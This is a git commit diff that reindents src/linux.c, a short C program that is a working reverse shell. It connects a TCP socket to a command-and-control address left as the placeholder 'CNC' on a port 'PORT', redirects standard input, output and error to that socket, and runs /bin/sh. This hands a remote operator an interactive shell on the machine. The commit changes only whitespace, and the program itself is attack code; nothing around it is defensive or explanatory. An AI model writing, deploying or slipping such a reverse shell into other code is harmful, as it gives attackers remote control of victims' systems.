d6ec8545b57f4d3938373f0a65caf4243043a9e1
Bytes-TheDust <trypwnme.hack@gmail.com>
2025-12-12 01:50:05 +0900

    Update linux.c

--- src/linux.c
+++ src/linux.c
@@ -7,22 +7,22 @@
 
 int main(int argc, char **argv)
 {
-        struct sockaddr_in serveraddr;
-        int server_sockfd;
-        int client_len;
-        char buf[80],rbuf[80], *cmdBuf[2]={"/bin/sh",(char *)0};
+    struct sockaddr_in serveraddr;
+    int server_sockfd;
+    int client_len;
+    char buf[80],rbuf[80], *cmdBuf[2]={"/bin/sh",(char *)0};
 
-        server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
-        serveraddr.sin_family = AF_INET;
-        serveraddr.sin_addr.s_addr = inet_addr("CNC"); 
-        serveraddr.sin_port = htons(atoi("PORT"));
-        client_len = sizeof(serveraddr);
+    server_sockfd = socket(AF_INET, SOCK_STREAM, 6);
+    serveraddr.sin_family = AF_INET;
+    serveraddr.sin_addr.s_addr = inet_addr("CNC"); 
+    serveraddr.sin_port = htons(atoi("PORT"));
+    client_len = sizeof(serveraddr);
 
-        connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);
+    connect(server_sockfd, (struct sockaddr*)&serveraddr, client_len);
 
-        dup2(server_sockfd, 0);
-        dup2(server_sockfd, 1);
-        dup2(server_sockfd, 2);
+    dup2(server_sockfd, 0);
+    dup2(server_sockfd, 1);
+    dup2(server_sockfd, 2);
 
-        execve("/bin/sh",cmdBuf,0);
+    execve("/bin/sh",cmdBuf,0);
 }
